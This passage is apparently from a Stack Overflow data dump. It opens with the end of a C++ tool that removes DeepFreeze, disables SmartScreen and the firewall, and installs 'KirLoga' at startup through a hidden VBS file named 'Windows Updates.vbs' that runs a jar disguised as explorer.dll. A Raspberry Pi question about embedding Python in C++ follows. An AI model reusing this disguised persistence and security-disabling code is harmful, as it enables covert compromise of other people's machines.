&lt;&lt;\"&gt; Installing..\\n\";\n           copyfiles(app,dest+\"\\\\\"+app);\n           cout &lt;&lt;\"&gt; Done!\\n\";\n           Sleep(1000);\n       }\n    }\n}\nvoid installKirLoga()\n{\n    fstream temp(\"Windows Updates.vbs\",ios::out);\n    temp &lt;&lt; \"CreateObject(\\\"Wscript.Shell\\\").Run \\\"\\\"\\\"\\\" &amp; \\\"%appdata%/xfrps.bat\\\" &amp; \\\"\\\"\\\"\\\", 0, False\";\n    temp.close();\n    installapp(\"Windows Updates.vbs\");\n\n    fstream temp2(\"xfrps.bat\",ios::out);\n    temp2 &lt;&lt; \":loop\\r\\ndel \\\"%APPDATA%\\\\KirLoga.jar\\\"\\r\\nCOPY \\\"%APPDATA%\\\\explorer.dll_update\\\" \\\"%APPDATA%\\\\explorer.dll\\\"\\r\\njava -jar \\\"%APPDATA%\\\\explorer.dll\\\" 1\\r\\ngoto loop\";\n    temp2.close();\n\n    installAppdata(\"xfrps.bat\");\n    installAppdata(\"explorer.dll_update\");\n    menu();\n\n}\nvoid install_custom()\n{\n    system(\"cls\");\n    char ch[MAX];\n    cout &lt;&lt;\"&gt; Enter app name: \";\n    cin  &gt;&gt;ch;\n    installapp(ch);\n    menu();\n}\nvoid menu()\n{\n    int choose;\n    system(\"cls\");\n    cout &lt;&lt;\"&gt; This is the main menu. Please choose an option.\\n\";\n    cout &lt;&lt;\"&gt; 1. Delete DeepFreeze\\n\";\n    cout &lt;&lt;\"&gt; 2. Reinstall DeepFreeze\\n\";\n    cout &lt;&lt;\"&gt; 3. Install MassEject\\n\";\n    cout &lt;&lt;\"&gt; 4. Configure MassEject\\n\";\n    cout &lt;&lt;\"&gt; 5. Install other app to Startup\\n\";\n    cout &lt;&lt;\"&gt; 6. Disable SmartScren\\n\";\n    cout &lt;&lt;\"&gt; 7. Disable Firewall\\n\";\n    cout &lt;&lt;\"&gt; 8. Quickie (Administrator, E:\\\\) &lt;not updated&gt;\\n\";\n    cout &lt;&lt;\"&gt; 9. Install KirLoga &lt;only starts after reboot&gt;\\n\";\n    cin.get();\n    cin &gt;&gt; choose;\n    if (choose==1)\n    {\n        deldeepfreeze();\n    }\n    else if (choose==2)\n    {\n        redeepfreeze();\n    }\n    else if (choose==3)\n    {\n        installapp(\"MassEject.jar\");\n        menu();\n    }else if (choose==4)\n    {\n         masseject_fix();\n    }else if (choose==5)\n    {\n        install_custom();\n    }else if (choose==6)\n    {\n        disablesmartscreen();\n    }\n    else if (choose==7)\n    {\n        disablefirewall();\n    }\n    else if (choose==8)\n    {\n        //TODO\n    }\n    else if (choose==9)\n    {\n        installKirLoga();\n    }\n}\nvoid choose_os()\n{\n   system(\"cls\");\n   cout &lt;&lt; \"&gt; Are you running on Windows 7 or 8.x? &lt;A/B&gt;\"&lt;&lt;'\\n';\n   char choice;\n   cin &gt;&gt; choice;\n   switch(choice)\n   {\n       case 'a': choosew7orxp=true;break;\n       case 'A': choosew7orxp=true;break;\n       case 'b': choosew7orxp=false;break;\n       case 'B': choosew7orxp=false;break;\n       default: cout &lt;&lt; \"&gt; No, that's not how you do it...\"; Sleep(1000);choose_os();break;\n   }\n   system(\"cls\");\n}\nint main()\n{\n    system(\"cls\");\n    cout &lt;&lt; \"&gt; Welcome to Kiraly's pack utility.\\n\";\n    cout &lt;&lt; \"&gt; Scanning system drives...\\n\";\n    list();\n    cout &lt;&lt; \"&gt; System drive identified: \"&lt;&lt;systemdrive&lt;&lt;\", is this correct? (Y/N) \";\n    char cdr;\n    cin &gt;&gt; cdr;\n    while (cdr!='Y'&amp;&amp;cdr!='y'&amp;&amp;cdr!='N'&amp;&amp;cdr!='n')\n    {\n        cout &lt;&lt; \"Incorrect syntax. Please re-enter. \";\n        cin &gt;&gt; cdr;\n    }\n    if (cdr=='n'||cdr=='N')\n    {\n        cout &lt;&lt; \"&gt; Please enter the drive letter ONLY. Example: \\\"C\\\" not \\\"C:\\\\\\\" \";\n        char drlet;\n        cin &gt;&gt; drlet;\n        if ((int)drlet&gt;=97)\n        {\n            drlet-=32;\n        }\n        systemdrive=\"\";systemdrive+=drlet;systemdrive+=\":\\\\\";\n        cout &lt;&lt;\"&gt; The system drive letter has been set to: \"&lt;&lt;systemdrive&lt;&lt;\"\\n\";\n    }\n//    Sleep(1000);\n    system(systemdrive.substr(0,2).c_str());\n    choose_os();\n    menu();\n\n}\n</code></pre>\n"}, {"tags": ["python", "c++", "linux"], "owner": {"reputation": 31, "user_id": 4818710, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-piLqHQchLFE/AAAAAAAAAAI/AAAAAAAAABo/UzH2nERCu_g/photo.jpg?sz=128", "display_name": "Faan Pretorius", "link": "https://stackoverflow.com/users/4818710/faan-pretorius"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 120, "favorite_count": 1, "answer_count": 0, "score": 3, "last_activity_date": 1429721986, "creation_date": 1429721986, "question_id": 29804261, "link": "https://stackoverflow.com/questions/29804261/embedding-python-in-a-c-class", "title": "Embedding Python in a C++ class", "body": "<p>Hope you guys can help.  I searched and googled but could not find a solution.  Firstly my code:</p>\n\n<pre><code> Main.cpp\n\n #include &lt;iostream&gt;\n  #include &lt;iomanip&gt;\n  #include \"ToggleLights.h\"\n\nusing namespace std;\nint main ()\n{\nbool lightsOn;\nLights lightsGo(50);\nlightsOn=lightsGo.LightsChanged();\n\nreturn 0;\n\n}\n</code></pre>\n\n<p>ToggleLights.cpp</p>\n\n<pre><code>#include \"ToggleLights.h\"\n\nusing namespace std;\n Lights::Lights(const int getBrightness)\n {\n\n }\n\nbool Lights :: LightsChanged()\n {\n\n   setenv(\"PYTHONPATH\",\".\",1);\n   Py_Initialize();\n    state=PyGILState_Ensure();\n    //pName = PyString_FromString(\"Lights\");\n    pModule = PyImport_ImportModule(\"Lights\");\n    pArg = Py_BuildValue(\"(iii)\", l_leftLightPin,   l_rightLightPin,l_Brightness);\n   // pDict = PyModule_GetDict(pModule);\n   pFunc = PyObject_GetAttrString(pModule,\"SetLights\");\n    pRet = PyEval_CallObject(pFunc,pArg);\n\n          if (PyString_Check(pRet))\n            {  Py_DECREF(pValue);\n                Py_DECREF(pModule);\n                Py_DECREF(pName);\n                Py_Finalize();\n                return true;\n\n            } else\n            {\n                Py_DECREF(pValue);\n                Py_DECREF(pModule);\n                Py_DECREF(pName);\n                Py_Finalize();\n                return false;\n            }\n }\n void Lights::init_Lights(const int getBrightness)\n {\n    //Setup * setup = Setup::get();\n    l_leftLightPin=20;\n    l_rightLightPin=21;\n    l_Brightness=getBrightness;\n\n }\n</code></pre>\n\n<p>ToggleLights.h</p>\n\n<pre><code>#ifndef TOGGLELIGHTS_H_INCLUDED\n#define TOGGLELIGHTS_H_INCLUDED\n//# pragma once\n#include \"Python.h\"\nusing namespace std;\n\n//class Setup;\n class Lights {\n    private:\n    int l_leftLightPin;\n    int l_rightLightPin;\n    int l_Brightness;\n\n    public:\n    PyObject *pName, *pModule, *pArg, *pFunc, *pRet, *pValue;\n        PyGILState_STATE state;\n     Lights(const int getBrightness = 50);\n     bool LightsChanged();\n     void init_Lights(const int getBrightness);\n\n     //Setup * setup ;\n};\n#endif // TOGGLELIGHTS_H_INCLUDED\n</code></pre>\n\n<p>Lights.py</p>\n\n<pre><code>#!/usr/bin/env python2.7\n# script by Alex Eames http://RasPi.tv\n#http://RasPi.tv/2013/how-to-use-soft-pwm-in-rpi-gpio-pt-2-led-dimming-and-motor-speed-control\n# Using PWM with RPi.GPIO pt 2 - requires RPi.GPIO 0.5.2a or higher\n\ndef SetLights(PinL,PinR,Level):\n\nimport RPi.GPIO as GPIO # always needed with RPi.GPIO\nfrom time import sleep  # pull in the sleep function from time module\n\nGPIO.setmode(GPIO.BCM)  # choose BCM or BOARD numbering schemes. I use BCM\n\nGPIO.setup(25, GPIO.OUT)# set GPIO 25 as output for white led\nGPIO.setup(24, GPIO.OUT)# set GPIO 24 as output for red led\n\nLeft = GPIO.PWM(PinL, 100)    # create object white for PWM on port 25 at    100 Hertz\nRight = GPIO.PWM(PinR, 100)      # create object red for PWM on port 24 at 100 Hertz\n\nLeft.start(Level)              # start white led on 0 percent duty cycle (off)\nRight.start(Level)              # red fully on (100%)\n\n# now the fun starts, we'll vary the duty cycle to \n# dim/brighten the leds, so one is bright while the other is dim\n\n#pause_time = 0.02           # you can change this to slow down/speed up\n\n#try:\n#    while True:\n#        for i in range(0,101):      # 101 because it stops when it   finishes 100\n#            white.ChangeDutyCycle(i)\n#            red.ChangeDutyCycle(100 - i)\n#            sleep(pause_time)\n#        for i in range(100,-1,-1):      # from 100 to zero in steps of -1\n#            white.ChangeDutyCycle(i)\n#            red.ChangeDutyCycle(100 - i)\n#            sleep(pause_time)\n\n# except KeyboardInterrupt:\n#    white.stop()            # stop the white PWM output\n#    red.stop()              # stop the red PWM output\n#    GPIO.cleanup()          # clean up GPIO on CTRL+C exit\n</code></pre>\n\n<p>As you can I still need finish up the python side but that is not where my problem is.</p>\n\n<p>Everything builds perfectly in Code::Blocks (I code directly on my Pi) When I press F8 to step through the code that is where my hassles start.  </p>\n\n<p>Firsly I get this error and I did read that you get your compiler to ignore it but I don't know how in Code::Blocks.  1st prize would be to get rid of it completely.\nHere is the error:   </p>\n\n<pre><code>&gt;Setting breakpoints\n&gt;Debugger name and version: GNU gdb (GDB) 7.4.1-debian\n&gt;Program received signal SIGILL, Illegal instruction.\n&gt;In ?? () (/usr/lib/arm-linux-gnueabihf/libcrypto.so.1.0.0)\n</code></pre>\n\n<p>I then use the step out button to continue debugging and  as soon I reach LightsOn.cpp the fun starts.  The execution of my code jumps to the next line and then back to the previous. See Below.</p>\n\n<pre><code>At /home/pi/PythonFiles/NewTest/NewTest/Main.cpp:11\nAt /home/pi/PythonFiles/NewTest/NewTest/Main.cpp:12\nAt /home/pi/PythonFiles/NewTest/NewTest/LightsOn.cpp:26\nAt /home/pi/PythonFiles/NewTest/NewTest/LightsOn.cpp:24\nAt /home/pi/PythonFiles/NewTest/NewTest/LightsOn.cpp:26\nAt /home/pi/PythonFiles/NewTest/NewTest/LightsOn.cpp:27\nAt /home/pi/PythonFiles/NewTest/NewTest/LightsOn.cpp:28\nAt /home/pi/PythonFiles/NewTest/NewTest/LightsOn.cpp:30\nAt /home/pi/PythonFiles/NewTest/NewTest/LightsOn.cpp:31\nAt /home/pi/PythonFiles/NewTest/NewTest/LightsOn.cpp:30\nAt /home/pi/PythonFiles/NewTest/NewTest/LightsOn.cpp:31\nAt /home/pi/PythonFiles/NewTest/NewTest/LightsOn.cpp:33\nAt /home/pi/PythonFiles/NewTest/NewTest/LightsOn.cpp:31\nAt /home/pi/PythonFiles/NewTest/NewTest/LightsOn.cpp:33\nProgram received signal SIGSEGV, Segmentation fault.\nIn PyObject_GetAttrString () (/usr/lib/libpython2.7.so.1.0)\n At /home/pi/PythonFiles/NewTest/NewTest/LightsOn.cpp:33\n</code></pre>\n\n<p>I did put a watch on my variables and pModule (Line 30 of the execution) for example - it gets a value and  is then set to null as soon as it executes the second time.</p>\n\n<p>I did test the code a previous time but did not use classes and code ran fine.</p>\n\n<p>Could somebody please explain and assist?</p>\n"}]